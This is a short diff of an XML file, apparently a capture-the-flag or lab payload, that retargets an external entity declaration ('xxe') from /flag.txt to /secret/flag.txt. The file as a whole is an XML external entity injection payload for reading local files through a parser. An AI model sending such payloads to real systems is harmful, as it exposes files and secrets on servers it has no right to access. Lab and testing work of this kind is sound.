@@ -1,6 +1,6 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE data [
-<!ENTITY xxe SYSTEM "/flag.txt">
+<!ENTITY xxe SYSTEM "/secret/flag.txt">
 ]>
 <feed>
     <title>test</title>
